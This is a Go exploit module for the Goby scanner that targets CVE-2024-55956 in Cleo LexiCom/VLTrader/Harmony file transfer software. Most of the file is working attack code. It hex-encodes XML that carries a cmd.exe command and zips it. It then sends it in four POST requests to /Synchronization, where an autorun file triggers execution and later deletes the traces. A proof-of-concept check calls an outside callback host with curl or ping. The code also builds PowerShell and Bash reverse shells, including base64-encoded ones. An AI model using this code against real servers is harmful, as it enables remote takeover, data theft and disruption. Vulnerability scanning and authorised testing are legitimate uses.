package exploits

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Cleo File Transfer Software /Synchronization Command Execution Vulnerability (CVE-2024-55956)",
    "Description": "<p>Cleo is a company that provides enterprise-level data transmission and integration solutions, with its products widely used in fields such as supply chain, finance, and customer relations. The /Synchronization interface of Cleo's file transfer software has a command execution vulnerability. Attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server privileges, and ultimately control the entire web server, leading to severe consequences such as sensitive information leakage, data tampering, and business disruption.</p>",
    "Product": "Cleo-LexiCom",
    "Homepage": "https://www.cleo.com/",
    "DisclosureDate": "2024-12-17",
    "PostTime": "2025-01-09",
    "Author": "chenyongqiang@baimaohui.net",
    "FofaQuery": "(header=\"Cleo LexiCom\" || header=\"Cleo VLTrader\" || header=\"Cleo Harmony\") && header=\"Content-Type: text/html\"",
    "GobyQuery": "(header=\"Cleo LexiCom\" || header=\"Cleo VLTrader\" || header=\"Cleo Harmony\") && header=\"Content-Type: text/html\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to execute arbitrary commands on the affected server, potentially leading to complete server control, sensitive information leakage, data tampering, and business interruptions.</p>",
    "Recommendation": "<p>It is recommended to immediately update Cleo file transfer software to the latest version and ensure that all security patches have been applied. Additionally, restrict access to sensitive interfaces, and implement security measures such as WAF (Web Application Firewall) to prevent the execution of malicious requests.</p>",
    "References": [
        "https://attackerkb.com/topics/geR0H8dgrE/cve-2024-55956/rapid7-analysis"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByPowershell",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "Cleo文件传输软件 /Synchronization 命令执行漏洞（CVE-2024-55956）",
            "Product": "Cleo文件传输软件",
            "Description": "<p>Cleo是一家提供企业级数据传输和集成解决方案的公司，其产品被广泛应用于供应链、财务和客户关系等领域。Cleo文件传输软件的 /Synchronization 接口存在命令执行漏洞，攻击者可通过该漏洞在服务器端执行任意代码，写入后门，获取服务器权限，进而控制整个web服务器，导致敏感信息泄露、数据篡改以及业务中断等严重后果。</p>",
            "Recommendation": "<p>建议立即更新Cleo文件传输软件至最新版本，并确保所有安全补丁已应用。同时，限制对敏感接口的访问权限，采用WAF（Web应用防火墙）等安全措施，防止恶意请求的执行。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器，导致敏感信息泄露、数据篡改以及业务中断等严重后果。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Cleo File Transfer Software /Synchronization Command Execution Vulnerability (CVE-2024-55956)",
            "Product": "Cleo-LexiCom",
            "Description": "<p>Cleo is a company that provides enterprise-level data transmission and integration solutions, with its products widely used in fields such as supply chain, finance, and customer relations. The /Synchronization interface of Cleo's file transfer software has a command execution vulnerability. Attackers can exploit this vulnerability to execute arbitrary code on the server, write backdoors, gain server privileges, and ultimately control the entire web server, leading to severe consequences such as sensitive information leakage, data tampering, and business disruption.<br></p>",
            "Recommendation": "<p>It is recommended to immediately update Cleo file transfer software to the latest version and ensure that all security patches have been applied. Additionally, restrict access to sensitive interfaces, and implement security measures such as WAF (Web Application Firewall) to prevent the execution of malicious requests.<br></p>",
            "Impact": "<p>This vulnerability allows attackers to execute arbitrary commands on the affected server, potentially leading to complete server control, sensitive information leakage, data tampering, and business interruptions.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "Cleo文件传输软件"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecNoEcho"
    },
    "VariablesOrder": [
        "TEMPLATE"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	geneZipbufferY0jN83 := func(fileStructure map[string]string, buffer *bytes.Buffer) {
		// 创建 ZIP 写入器
		zipWriter := zip.NewWriter(buffer)

		// 添加文件到 ZIP 中
		for name, content := range fileStructure {
			// 创建文件
			writer, err := zipWriter.Create(name)
			if err != nil {
				return
			}

			// 写入内容
			_, err = writer.Write([]byte(content))
			if err != nil {
				return
			}
		}

		// 关闭 ZIP 写入器
		if err := zipWriter.Close(); err != nil {
			return
		}
	}
	//setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequestHashvDmaOYOZgJ := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {

		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {

			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		urlPost := "/Synchronization"

		//拼接xml文件和命令，后续这里的dnsurl替换为nslookup和powershell
		var buffer bytes.Buffer
		xmlPayload1 := "3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d3822207374616e64616c6f6e653d22796573223f3e0a3c486f737420616c6961733d2264376363323439302d303361392d343861382d386166642d62643730343263666462643522206170706c69636174696f6e3d22222062793d2241646d696e6973747261746f722220636c6173733d222a437777514e77776245523453456841384578346345444e525151775242777362476b35544551644f45415557546b4d2a2220637265617465643d22323032302f31302f31302030303a30303a30302220656e61626c65643d22547275652220656e633d2239353732343634652d373862352d343633352d386133622d30623937393964643862663922206c6f63616c3d225472756522206d6f646576656e743d224d6f64696669656422206d6f6469666965643d22323032302f31302f31302030303a30303a303022206d6f646974656d3d22266c743b636f70792667743b6d79436f6d6d616e6473404c6f63616c20436f6d6d616e647322206d6f64747970653d22416374696f6e732220707265636f6e666967757265643d22323030392f31302f33302031353a3135222072656164793d225472756522207374616e64616c6f6e65616374696f6e3d2246616c73652220746573743d2246616c736522207472616e73706f72743d222220747970653d2222207569643d2264363330613565622d326335612d343265362d393534302d373763326261353130363232222076657273696f6e3d2231223e0a20203c436f6e6e656374747970653e303c2f436f6e6e656374747970653e0a20203c496e626f783e696e626f783c2f496e626f783e0a20203c496e6465783e303c2f496e6465783e0a20203c496e646578646174653e2d313c2f496e646578646174653e0a20203c496e7465726e616c3e303c2f496e7465726e616c3e0a20203c4e6f7465733e5468697320636f6e7461696e73206d61696c626f78657320666f722061206c6f63616c20686f73742077686963682063616e206265207573656420666f72206c6f63616c20636f6d6d616e6473206f6e6c792e3c2f4e6f7465733e0a20203c4f726967696e3e4c6f63616c20436f6d6d616e64733c2f4f726967696e3e0a20203c4f7574626f783e6f7574626f783c2f4f7574626f783e0a20203c506f72743e303c2f506f72743e0a20203c52756e6e696e676c6f63616c72657175697265643e547275653c2f52756e6e696e676c6f63616c72657175697265643e0a20203c536563757265706f727472657175697265643e46616c73653c2f536563757265706f727472657175697265643e0a20203c556964737770643e547275653c2f556964737770643e0a20203c416476616e6365643e5a6970436f6d7072657373696f6e4c6576656c3d53797374656d2044656661756c743c2f416476616e6365643e0a20203c416476616e6365643e584d4c456e6372797074696f6e416c676f726974686d3d53797374656d2044656661756c743c2f416476616e6365643e0a20203c416476616e6365643e486967685072696f72697479496e636f6d696e675765696768743d31303c2f416476616e6365643e0a20203c416476616e6365643e50475048617368416c676f726974686d3d53797374656d2044656661756c743c2f416476616e6365643e0a20203c416476616e6365643e486967685072696f726974794f7574676f696e675765696768743d31303c2f416476616e6365643e0a20203c416476616e6365643e504750436f6d7072657373696f6e416c676f726974686d3d53797374656d2044656661756c743c2f416476616e6365643e0a20203c416476616e6365643e4f7574626f78536f72743d53797374656d2044656661756c743c2f416476616e6365643e0a20203c416476616e6365643e504750456e6372797074696f6e416c676f726974686d3d53797374656d2044656661756c743c2f416476616e6365643e0a20203c4d61696c626f7820616c6961733d2265666337366261302d323061642d343763642d393534632d6364356435623436643333642220636c6173733d222a42784164457859654d67776245523453456841384578346345444e522220637265617465643d22323032302f31302f31302030303a30303a30302220656e61626c65643d225472756522206c6f63616c64656372797074636572743d2222206c6f63616c656e6372797074636572743d2222206c6f63616c7061636b6167696e673d224e6f6e652220706172746e657264656372797074636572743d222220706172746e65726465637279707470617373776f72643d222220706172746e6572656e6372797074636572743d222220706172746e65727061636b6167696e673d224e6f6e65222072656164793d225472756522207569643d2262376462323563372d383935652d343430642d393231372d393262326363643532326562222076657273696f6e3d2231223e0a202020203c416374696f6e20616374696f6e747970653d22436f6d6d616e64732220616c6961733d2236636164303764382d623239372d346465612d623065612d633666303338316534313637222062793d2241646d696e6973747261746f722220636c6173733d222a455241574378772b444273524868495345447754486877514d31452a2220637265617465643d22323032302f31302f31302030303a30303a30302220656e61626c65643d225472756522206d6f6469666965643d22323032302f31302f31302030303a30303a3030222072656164793d225472756522207569643d2261386236393166662d303332652d346662362d626562632d653635613330333265646364222076657273696f6e3d2232223e0a2020202020203c4175746f737461727475703e46616c73653c2f4175746f737461727475703e0a2020202020203c436f6d6d616e64733e3c215b43444154415b53595354454d20636d642e657865202f632022"
		xmlPayload2 := "225d5d3e3c2f436f6d6d616e64733e0a2020202020203c46696c6573696e3e303c2f46696c6573696e3e0a2020202020203c46696c65736f75743e303c2f46696c65736f75743e0a2020202020203c53736c3e46616c73653c2f53736c3e0a202020203c2f416374696f6e3e0a20203c2f4d61696c626f783e0a3c2f486f73743e"

		decodedBytes1, _ := hex.DecodeString(xmlPayload1)
		decodedBytes2, _ := hex.DecodeString(xmlPayload2)

		randStr1 := goutils.RandomHexString(16)
		randStr2 := goutils.RandomHexString(16)
		randStr3 := goutils.RandomHexString(16)
		randStr4 := goutils.RandomHexString(16)

		fileStructure := map[string]string{
			"hosts/main.xml": string(decodedBytes1) + command + string(decodedBytes2),
		}

		geneZipbufferY0jN83(fileStructure, &buffer)

		headers := map[string]string{
			"VLSync":       "Multipart;l=0,Acknowledge",
			"Content-Type": "application/form-data;boundary=--------boundary",
		}

		//两次请求文件名需要换
		payloadPrefix1 := fmt.Sprintf("VLSync: ReceivedReceipt;service=\"AS2\";msgId=12345;path=\"temp/%s.tmp\";receiptfolder=Unspecified;\r\n--------boundary\r\n", randStr1)
		payloadPrefix2 := fmt.Sprintf("VLSync: ReceivedReceipt;service=\"AS2\";msgId=12345;path=\"autorun/%s.txt\";receiptfolder=Unspecified;\r\n--------boundary\r\n", randStr2)
		payloadPrefix3 := fmt.Sprintf("VLSync: ReceivedReceipt;service=\"AS2\";msgId=12345;path=\"temp/%s.tmp\";receiptfolder=Unspecified;\r\n--------boundary\r\n", randStr3)
		payloadPrefix4 := fmt.Sprintf("VLSync: ReceivedReceipt;service=\"AS2\";msgId=12345;path=\"autorun/%s.txt\";receiptfolder=Unspecified;\r\n--------boundary\r\n", randStr4)

		payload1 := payloadPrefix1 + string(buffer.Bytes())
		payload2 := payloadPrefix2 + fmt.Sprintf("-i \"temp/%s.tmp\"\r\n-r \"<6cad07d8-b297-4dea-b0ea-c6f0381e4167>efc76ba0-20ad-47cd-954c-cd5d5b46d33d@d7cc2490-03a9-48a8-8afd-bd7042cfdbd5\"", randStr1)

		delSelfCmd := "timeout /t 5 /nobreak >nul & del autorun/" + randStr2 + ".txt & del temp/" + randStr1 + "tmp & del autorun/" + randStr4 + ".txt"
		fileStructure = map[string]string{
			"hosts/main.xml": string(decodedBytes1) + delSelfCmd + string(decodedBytes2),
		}
		geneZipbufferY0jN83(fileStructure, &buffer)
		payload3 := payloadPrefix3 + string(buffer.Bytes())
		payload4 := payloadPrefix4 + fmt.Sprintf("-i \"temp/%s.tmp\"\r\n-r \"<6cad07d8-b297-4dea-b0ea-c6f0381e4167>efc76ba0-20ad-47cd-954c-cd5d5b46d33d@d7cc2490-03a9-48a8-8afd-bd7042cfdbd5\"", randStr3)

		resp, err := setPostRequest(hostInfo, urlPost, payload1, headers)

		if resp == nil {
			return false, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return false, "", err
		}
		resp, err = setPostRequest(hostInfo, urlPost, payload2, headers)
		if resp == nil {
			return false, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return false, "", err
		}
		resp, err = setPostRequest(hostInfo, urlPost, payload3, headers)
		if resp == nil {
			return false, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return false, "", err
		}
		resp, err = setPostRequest(hostInfo, urlPost, payload4, headers)
		if resp == nil {
			return false, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 200 {
			return false, "", err
		}
		vulURL = "/Synchronization"
		return true, vulURL, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHashvDmaOYOZgJ函数赋值给runPayload
			runPayload := setPayloadRequestHashvDmaOYOZgJ

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(8)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				pocCommand = "ping -c 1 " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*30) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHashvDmaOYOZgJ函数赋值给runPayload
			runPayload := setPayloadRequestHashvDmaOYOZgJ

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 60):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
